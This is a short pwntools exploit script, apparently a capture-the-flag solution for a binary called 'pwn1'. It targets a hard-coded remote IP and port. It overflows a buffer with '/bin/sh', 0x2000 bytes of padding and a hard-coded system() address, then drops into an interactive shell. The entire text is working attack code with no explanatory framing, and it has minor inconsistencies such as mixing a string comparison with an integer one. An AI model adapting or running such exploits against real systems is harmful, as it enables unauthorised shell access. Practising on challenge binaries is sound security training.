from pwn import *
context(arch="amd64",os="linux",log_level="debug")
context.terminal=['tmux','splitw','-h']
print(args)
if args['REMOTE'] == '1':
    print("remote")
    p=remote("152.136.44.97",20001)
else:
    p=process("./pwn1")
if args["GDB"] =="1":
    gdb.attach(p,"b *0x40074e")
bin_sh = "/bin/sh\x00"
system_addr = 0x00000004005a0
payload=bin_sh + "a"*(0x2000) + p64(system_addr) +p64(0xbeefdeef)
p.recvuntil(":")
p.sendline(payload)
if args["GDB"]==1:
    pause()
sleep(2)
p.interactive()
